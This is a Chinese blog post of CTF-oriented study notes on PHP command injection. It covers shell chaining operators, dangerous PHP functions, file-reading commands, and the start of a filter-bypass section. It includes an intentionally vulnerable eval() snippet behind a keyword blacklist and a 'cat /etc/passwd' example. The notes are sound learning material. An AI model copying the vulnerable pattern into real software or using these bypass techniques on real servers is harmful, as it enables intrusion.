<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta name="author" content="Regulus"/><meta name="copyright" content="Regulus"/><meta name="theme-color" content="#FFB347"/><meta name="format-detection" content="telephone=no"/><meta name="keywords" content="Hexo Theme MEOW"/><meta name="mobile-web-app-capable" content="yes"/><meta name="apple-mobile-web-app-capable" content="yes"/><meta name="apple-touch-fullscreen" content="yes"/><meta name="application-name" content="php命令执行 | Mei的小窝"/><meta name="apple-mobile-web-app-title" content="php命令执行 | Mei的小窝"/><meta name="apple-mobile-web-app-status-bar-style" content="#FFB347"/><link rel="canonical" href="http://example.com/2025/02/05/php命令执行/"/><meta name="description" content="命令执行漏洞笔记前言文件包含漏洞条件有点苛刻，在学不下的感觉，正好看了下linux命令，来看下命令执行漏洞 1.什么是命令执行漏洞命令执行漏洞是一种网络安全漏洞，它允许攻击者在受影响的系统上执行恶意命令。这种漏洞通常出现在软件应用程序或系统中，其典型示例是 [Web 应用程序](https:&#x2F;&#x2F;so.csdn.net&#x2F;so&#x2F;search?q&#x3D;Web 应用程序&amp;spm&#x3D;100...">
<meta property="og:type" content="article">
<meta property="og:title" content="php命令执行 | Mei的小窝">
<meta property="og:url" content="http://example.com/2025/02/05/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html">
<meta property="og:site_name" content="Mei的小窝">
<meta property="og:description" content="命令执行漏洞笔记前言文件包含漏洞条件有点苛刻，在学不下的感觉，正好看了下linux命令，来看下命令执行漏洞 1.什么是命令执行漏洞命令执行漏洞是一种网络安全漏洞，它允许攻击者在受影响的系统上执行恶意命令。这种漏洞通常出现在软件应用程序或系统中，其典型示例是 [Web 应用程序](https:&#x2F;&#x2F;so.csdn.net&#x2F;so&#x2F;search?q&#x3D;Web 应用程序&amp;spm&#x3D;100...">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/2025/02/05/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/assets/images/Hexo-Theme-MEOW.png">
<meta property="article:published_time" content="2025-02-05T07:42:02.000Z">
<meta property="article:modified_time" content="2025-12-16T09:09:34.425Z">
<meta property="article:author" content="Regulus">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://example.com/2025/02/05/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/assets/images/Hexo-Theme-MEOW.png"><meta name="robots" content="index,follow"/><meta name="googlebot" content="index,follow"/><meta name="revisit-after" content="1 days"/><title>php命令执行 | Mei的小窝</title><link rel="shortcut icon" href="/assets/images/Hexo-Theme-MEOW.ico"><link rel="preconnect" href="/assets"/><link rel="preconnect" href="assets"/>
<link rel="stylesheet" href="/css/style.css">
<link rel="prefetch" href="/"/><link rel="prefetch" href="/archives"/><link rel="prefetch" href="/tags"/><meta name="generator" content="Hexo 7.3.0"></head><body bg-style="none"><header><div id="navbar"><div id="nav-info"><a id="site-icon" href="/" title="主页"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></a><a id="site-name" href="/" title="主页"><div>Mei的小窝</div><img src="/assets/images/svg/uc/uc-home.svg" class="icon noview" alt="Icon"></a></div><div id="nav-menu"><div class="menu-item"><a href="javascript:void(0);"><img src="/assets/images/svg/uc/uc-article.svg" class="icon noview" alt="Icon"><span>文章</span></a><ul class="sub-menu-item"><li><a href="/archives"><img src="/assets/images/svg/uc/uc-archive.svg" class="icon noview" alt="Icon"><span>归档</span></a></li><li><a href="/categories"><img src="/assets/images/svg/uc/uc-category.svg" class="icon noview" alt="Icon"><span>分类</span></a></li><li><a href="/tags"><img src="/assets/images/svg/uc/uc-tag.svg" class="icon noview" alt="Icon"><span>标签</span></a></li><li><a href="/about"><img src="/assets/images/svg/uc/uc-about.svg" class="icon noview" alt="Icon"><span>关于</span></a></li></ul></div></div><div id="nav-function"><div id="search-btn"><a href="javascript:void(0);" title="搜索" accesskey="s"><img src="/assets/images/svg/uc/uc-search.svg" class="icon noview" alt="Icon"><span>搜索</span></a></div><div id="menu-btn"><a href="javascript:void(0);" title="打开菜单"><img src="/assets/images/svg/uc/uc-menu.svg" class="icon noview" alt="Icon"></a></div></div></div></header><div id="menu-aside"><div id="menu-aside-container"><div id="menu-aside-info"><a href="/" title="主页"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></a><a href="/" title="主页">Mei的小窝</a></div><div class="menu-aside-item"><a href="javascript:void(0);"><img src="/assets/images/svg/uc/uc-article.svg" class="icon noview" alt="Icon"><span>文章</span></a><ul class="menu-aside-sub-item"><li><a href="/archives"><img src="/assets/images/svg/uc/uc-archive.svg" class="icon noview" alt="Icon"><span>归档</span></a></li><li><a href="/categories"><img src="/assets/images/svg/uc/uc-category.svg" class="icon noview" alt="Icon"><span>分类</span></a></li><li><a href="/tags"><img src="/assets/images/svg/uc/uc-tag.svg" class="icon noview" alt="Icon"><span>标签</span></a></li><li><a href="/about"><img src="/assets/images/svg/uc/uc-about.svg" class="icon noview" alt="Icon"><span>关于</span></a></li></ul></div><hr/></div></div><main><div class="banner"><div class="banner-info"><div class="banner-avatar"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Avatar"/></div><div class="banner-title">「 Mei的小窝 」</div></div></div><div class="post-container"><div class="post-main"><div class="post-content"><h1 class="post-title">php命令执行</h1><div class="post-author"><span>作者: Regulus</span></div><div class="post-meta"><div class="post-info"><div class="post-date"><div class="post-pubdate"><img src="/assets/images/svg/ta/ta-pubdate.svg" class="icon noview" alt="Icon"><span>发表于2025-02-05</span></div><div class="post-update"><img src="/assets/images/svg/ta/ta-update.svg" class="icon noview" alt="Icon"><span>更新于2025-12-16</span></div></div><div class="post-read"><div class="post-wordcount"><img src="/assets/images/svg/ta/ta-write.svg" class="icon noview" alt="Icon"><span>总字数: 8.3k字</span></div><div class="post-readtime"><img src="/assets/images/svg/ta/ta-time.svg" class="icon noview" alt="Icon"><span>阅读时长: 27分钟</span></div><div class="post-pageview"><img src="/assets/images/svg/ta/ta-fire.svg" class="icon noview" alt="Icon"><span>访问量: </span><span id="vercount_value_page_pv"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"  stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 6l0 -3" /><path d="M16.25 7.75l2.15 -2.15" /><path d="M18 12l3 0" /><path d="M16.25 16.25l2.15 2.15" /><path d="M12 18l0 3" /><path d="M7.75 16.25l-2.15 2.15" /><path d="M6 12l-3 0" /><path d="M7.75 7.75l-2.15 -2.15" /></svg></span></div></div></div><div class="post-attribute"></div></div><div class="post markdown" indent="false"><h1 id="命令执行漏洞笔记"><a href="#命令执行漏洞笔记" class="headerlink" title="命令执行漏洞笔记"></a>命令执行漏洞笔记</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>文件包含漏洞条件有点苛刻，在学不下的感觉，正好看了下linux命令，来看下命令执行漏洞</p>
<h3 id="1-什么是命令执行漏洞"><a href="#1-什么是命令执行漏洞" class="headerlink" title="1.什么是命令执行漏洞"></a>1.什么是命令执行漏洞</h3><p>命令执行漏洞是一种网络安全漏洞，它允许攻击者在受影响的系统上执行恶意命令。这种漏洞通常出现在软件应用程序或系统中，其典型示例是 [Web 应用程序](<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=Web">https://so.csdn.net/so/search?q=Web</a> 应用程序&amp;spm&#x3D;1001.2101.3001.7020)中的远程命令执行（RCE）漏洞</p>
<h3 id="2-出现漏洞的原因"><a href="#2-出现漏洞的原因" class="headerlink" title="2.出现漏洞的原因"></a>2.出现漏洞的原因</h3><p>应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、passthru、popen、proc_popen等，当用户能控制这些函数的参数，并且开发人员对这个参数没有严格的过滤时就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。</p>
<ul>
<li><p>未正确验证用户输入：应用程序未对用户提供的输入进行有效的验证或过滤，使得攻击者可以通过恶意输入注入命令。例如，没有过滤&amp;、&amp;&amp;、|、||等连接符</p>
</li>
<li><p>将用户输入作为命令执行的一部分：应用程序在执行系统命令、数据库查询或其他操作时，未正确处理用户输入，导致攻击者能够通过注入恶意命令来执行任意操作。</p>
</li>
<li><p>应用程序缺乏必要的安全控制机制，使得攻击者能够利用漏洞执行命令并获取系统权限</p>
</li>
</ul>
<p>我们来看下简单命令执行漏洞的源代码：</p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line">通过<span class="keyword">eval</span>()函数 我们可以执行系统命令拿到flag</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>



<h2 id="1-命令拼接符"><a href="#1-命令拼接符" class="headerlink" title="1.命令拼接符"></a>1.命令拼接符</h2><p>我们一般需要使用命令拼接符才可以执行我们自己写上去的代码</p>
<h3 id="1-Windows"><a href="#1-Windows" class="headerlink" title="1.Windows"></a>1.Windows</h3><div class="table-container"><table>
<thead>
<tr>
<th>拼接符</th>
<th>示例</th>
<th>详解</th>
</tr>
</thead>
<tbody><tr>
<td>&amp;</td>
<td>a&amp;b</td>
<td>无论a是否正确b都会执行</td>
</tr>
<tr>
<td>&amp;&amp;</td>
<td>a&amp;&amp;b</td>
<td>当a正确b才会执行</td>
</tr>
<tr>
<td>||</td>
<td>a||b</td>
<td>a执行失败然后才执行b</td>
</tr>
<tr>
<td>|</td>
<td>a|b</td>
<td>表示A命令语句的输出，作为B命令语句的输入执行。当A失败的时候将不会执行</td>
</tr>
</tbody></table></div>
<h3 id="2-Linux"><a href="#2-Linux" class="headerlink" title="2.Linux"></a>2.Linux</h3><div class="table-container"><table>
<thead>
<tr>
<th>拼接符</th>
<th>详解</th>
</tr>
</thead>
<tbody><tr>
<td>|</td>
<td>表示A命令语句的输出，作为B命令语句的输入执行。当A失败的时候将不会执行</td>
</tr>
<tr>
<td>%0a</td>
<td>应该是回车键的url编码，不知道为什么也可以用来拼接</td>
</tr>
<tr>
<td>&amp;</td>
<td>后台运行</td>
</tr>
<tr>
<td>&amp;&amp;</td>
<td>当a正确b才会执行</td>
</tr>
<tr>
<td>||</td>
<td>a||b</td>
</tr>
<tr>
<td>（）</td>
<td>如果想执行几个命令，则需要用命令分隔符分号隔开每个命令，并使用 圆括号()把所有命令组合起来,示例如下</td>
</tr>
<tr>
<td>;</td>
<td>将多个命令用;分隔开可以运行多个命令</td>
</tr>
</tbody></table></div>
<h2 id="2-危险函数"><a href="#2-危险函数" class="headerlink" title="2.危险函数"></a>2.危险函数</h2><div class="table-container"><table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">返回值类型</th>
<th align="left">是否直接打印输出</th>
<th align="left">示例</th>
<th align="left">安全风险</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong><code>shell_exec()</code></strong></td>
<td align="left"><code>string</code></td>
<td align="left">❌ 否</td>
<td align="left"><code>$out = shell_exec(&#39;ls&#39;);</code></td>
<td align="left">高风险，需严格过滤输入</td>
</tr>
<tr>
<td align="left">**反引号 **</td>
<td align="left">string</td>
<td align="left">❌ 否</td>
<td align="left">$out &#x3D; <code>ls</code>;</td>
<td align="left">同 shell_exec()</td>
</tr>
<tr>
<td align="left"><strong><code>exec()</code></strong></td>
<td align="left">最后一行或数组</td>
<td align="left">❌ 否</td>
<td align="left"><code>exec(&#39;ls&#39;, $output);</code></td>
<td align="left">需注意第二个参数（数组输出）</td>
</tr>
<tr>
<td align="left"><strong><code>passthru()</code></strong></td>
<td align="left"><code>void</code></td>
<td align="left">✅ 是</td>
<td align="left"><code>passthru(&#39;ls&#39;);</code></td>
<td align="left">直接输出，高危</td>
</tr>
<tr>
<td align="left"><strong><code>system()</code></strong></td>
<td align="left">最后一行</td>
<td align="left">✅ 是</td>
<td align="left"><code>system(&#39;ls&#39;);</code></td>
<td align="left">直接输出，高危</td>
</tr>
</tbody></table></div>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">php代码相关</span><br><span class="line"><span class="keyword">eval</span>()</span><br><span class="line"><span class="title function_ invoke__">assert</span>()</span><br><span class="line">preg_replace</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>()</span><br><span class="line"><span class="title function_ invoke__">call_user_func_array</span>()</span><br><span class="line">create_function</span><br><span class="line"><span class="title function_ invoke__">array_map</span>()</span><br><span class="line">系统命令执行相关</span><br><span class="line"><span class="title function_ invoke__">system</span>()</span><br><span class="line"><span class="title function_ invoke__">passthru</span>()</span><br><span class="line"><span class="title function_ invoke__">exec</span>()</span><br><span class="line"><span class="title function_ invoke__">pcntl_exec</span>()</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>()</span><br><span class="line"><span class="title function_ invoke__">popen</span>()</span><br><span class="line"><span class="title function_ invoke__">proc_open</span>()</span><br><span class="line">`(反单引号)</span><br><span class="line"><span class="title function_ invoke__">ob_start</span>()</span><br><span class="line">特殊函数</span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>()</span><br><span class="line"><span class="comment">#这个文件里面包含了PHP的编译选项，启动的扩展、版本、服务器配置信息、环境变量、操作系统信息、path变量等非常重要的敏感配置信息</span></span><br><span class="line"><span class="title function_ invoke__">symlink</span>()：</span><br><span class="line"><span class="comment">#一般是在linux服务器上使用的，为一个目标建立一个连接，在读取这个链接所连接的文件的内容，并返回内容</span></span><br><span class="line">getenv</span><br><span class="line"><span class="comment">#获取一个环境变量的值</span></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="variable">$a</span>)</span><br><span class="line"><span class="comment">#添加$a到服务器环境变量，但环境变量仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>危险函数太多了，全部记住基本不可能，全部写下来也很麻烦，看得多了就记住了。到时候php手册会帮我的</p>
<div class="table-container"><table>
<thead>
<tr>
<th><code>cat</code></th>
<th>显示整个文件内容</th>
<th><code>cat file.txt</code></th>
<th>快速查看小文件</th>
</tr>
</thead>
<tbody><tr>
<td><code>less</code></td>
<td>分页交互式查看（可上下翻页）</td>
<td><code>less file.txt</code></td>
<td>查看大文件或日志</td>
</tr>
<tr>
<td><code>more</code></td>
<td>分页查看（仅向下翻页）</td>
<td><code>more file.txt</code></td>
<td>基础分页（兼容性高）</td>
</tr>
<tr>
<td><code>head</code></td>
<td>显示文件开头部分（默认前 10 行）</td>
<td><code>head -n 20 file.txt</code></td>
<td>查看文件头部内容</td>
</tr>
<tr>
<td><code>tail</code></td>
<td>显示文件末尾部分（默认后 10 行）</td>
<td><code>tail -n 20 file.txt</code></td>
<td>查看日志或文件尾部</td>
</tr>
<tr>
<td><code>tac</code></td>
<td>反向显示文件内容（从最后一行到第一行）</td>
<td><code>tac file.txt</code></td>
<td>逆向查看日志</td>
</tr>
<tr>
<td><code>nl</code></td>
<td>显示内容并添加行号</td>
<td><code>nl file.txt</code></td>
<td>需要行号时</td>
</tr>
<tr>
<td><code>grep</code></td>
<td>过滤包含特定模式的行</td>
<td><code>grep &quot;error&quot; file.txt</code></td>
<td>搜索关键词</td>
</tr>
<tr>
<td><code>awk</code></td>
<td>按列或条件提取内容</td>
<td><code>awk &#39;&#123;print $1&#125;&#39; file.txt</code></td>
<td>处理结构化文本（如 CSV）</td>
</tr>
<tr>
<td><code>sed</code></td>
<td>流编辑器，支持按行提取</td>
<td><code>sed -n &#39;5,10p&#39; file.txt</code></td>
<td>提取特定行或替换内容</td>
</tr>
<tr>
<td><code>cut</code></td>
<td>按列分割提取内容</td>
<td><code>cut -d &#39;,&#39; -f 1 file.txt</code></td>
<td>提取特定列（如分隔符文件）</td>
</tr>
<tr>
<td><code>strings</code></td>
<td>提取二进制文件中的可打印字符串</td>
<td><code>strings /bin/ls</code></td>
<td>分析二进制文件</td>
</tr>
<tr>
<td><code>od</code></td>
<td>以二进制&#x2F;十六进制格式查看</td>
<td><code>od -c file.txt</code></td>
<td>查看文件原始编码</td>
</tr>
<tr>
<td><code>xxd</code></td>
<td>生成十六进制转储</td>
<td><code>xxd file.txt</code></td>
<td>二进制文件分析</td>
</tr>
<tr>
<td><code>rev</code></td>
<td>反转每行字符顺序</td>
<td><code>rev file.txt</code></td>
<td>调试或特殊需求</td>
</tr>
<tr>
<td><code>zcat</code></td>
<td>直接查看压缩文件（<code>.gz</code> 格式）</td>
<td><code>zcat file.gz</code></td>
<td>无需解压查看压缩文件</td>
</tr>
<tr>
<td><code>vim</code>&#x2F;<code>nano</code></td>
<td>文本编辑器打开文件</td>
<td><code>vim file.txt</code></td>
<td>需要编辑时</td>
</tr>
</tbody></table></div>
<h3 id="1-system"><a href="#1-system" class="headerlink" title="1.system()"></a>1.system()</h3><p>system — 执行外部程序，并且显示输出</p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="keyword">string</span> <span class="variable">$command</span>, <span class="keyword">int</span> &amp;<span class="variable">$result_code</span> = <span class="literal">null</span>): <span class="keyword">string</span>|<span class="literal">false</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>同 C 版本的 <strong>system()</strong> 函数一样，本函数执行 <code>command</code> 参数所指定的命令，并且输出执行结果。</p>
<p>如果 PHP 运行在服务器模块中，<strong>system()</strong> 函数还会尝试在每行输出完毕之后，自动刷新 web 服务器的输出缓存。</p>
<p>如果要获取一个命令未经任何处理的原始输出，请使用 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.passthru.php">passthru()</a> 函数。</p>
<p><strong>参数</strong></p>
<p>$command</p>
<p>要执行的命令。</p>
<p>$result_code</p>
<p>如果提供 <code>result_code</code> 参数，则外部命令执行后的返回状态将会被设置到此变量中。</p>
<p><strong>返回值</strong></p>
<p>成功则返回命令输出的最后一行，失败则返回 <strong>false</strong></p>
<h3 id="2-passthru"><a href="#2-passthru" class="headerlink" title="2.passthru()"></a>2.passthru()</h3><p>passthru — 执行外部程序并且显示原始输出</p>
<p><strong>语法</strong></p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">passthru</span>(<span class="keyword">string</span> <span class="variable">$command</span>, <span class="keyword">int</span> &amp;<span class="variable">$result_code</span> = <span class="literal">null</span>): ?<span class="literal">false</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>同 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.exec.php">exec()</a> 函数类似， <strong>passthru()</strong> 函数 也是用来执行外部命令（<code>command</code>）的。 当所执行的 Unix 命令输出二进制数据， 并且需要直接传送到浏览器的时候， 需要用此函数来替代 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.exec.php">exec()</a> 或 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.system.php">system()</a> 函数。 常用来执行诸如 pbmplus 之类的可以直接输出图像流的命令。 通过设置 Content-type 为 <code>image/gif</code>， 然后调用 pbmplus 程序输出 gif 文件， 就可以从 PHP 脚本中直接输出图像到浏览器。</p>
<p><strong>参数</strong>同system()</p>
<p><strong>返回值</strong></p>
<p>成功则返回命令输出的最后一行，失败则返回 <strong>false</strong></p>
<h3 id="3-exec"><a href="#3-exec" class="headerlink" title="3.exec()"></a>3.exec()</h3><p>exec — 执行一个外部程序</p>
<p><strong>语法</strong></p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">exec</span>(<span class="keyword">string</span> <span class="variable">$command</span>, <span class="keyword">array</span> &amp;<span class="variable">$output</span> = <span class="literal">null</span>, <span class="keyword">int</span> &amp;<span class="variable">$result_code</span> = <span class="literal">null</span>): <span class="keyword">string</span>|<span class="literal">false</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p><strong>exec()</strong> 执行 <code>command</code> 参数所指定的命令。</p>
<p><strong>参数</strong></p>
<p>$output<br>如果提供了 <code>output</code> 参数， 那么会用命令执行的输出填充此数组， 每行输出填充数组中的一个元素。 数组中的数据不包含行尾的空白字符，例如 <code>\n</code> 字符。 请注意，如果数组中已经包含了部分元素，<strong>exec()</strong> 函数会在数组末尾追加内容。如果你不想在数组末尾进行追加， 请在传入 <strong>exec()</strong> 函数之前 对数组使用 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.unset.php">unset()</a> 函数进行重置。</p>
<p><strong>返回值</strong></p>
<p>命令执行结果的最后一行内容。 如果你需要获取未经处理的全部输出数据， 请使用 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.passthru.php">passthru()</a> 函数。</p>
<p>失败时返回 **<code>false</code>**。</p>
<p>如果想要获取命令的输出内容， 请确保使用 <code>output</code> 参数。</p>
<h2 id="3-过滤绕过"><a href="#3-过滤绕过" class="headerlink" title="3.过滤绕过"></a>3.过滤绕过</h2><p>到了一个新的地方，各种关键字过滤肯定是要来了</p>
<h3 id="1-通配符"><a href="#1-通配符" class="headerlink" title="1.通配符"></a>1.通配符</h3><p><strong>常见的通配符</strong></p>
<div class="table-container"><table>
<thead>
<tr>
<th>符号</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>？</td>
<td>匹配单个字符如果匹配多个字符，就需要多个?连用</td>
</tr>
<tr>
<td>*</td>
<td>*代表任意数量的字符</td>
</tr>
<tr>
<td>[ ]</td>
<td>代表一定有一个在括号内的字符(非任意字符)。例如 [abcd] 代表一定有一个字符， 可能是 a, b, c, d 这四个任何一个</td>
</tr>
</tbody></table></div>
<p>一个常用的读取密码命令如下</p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

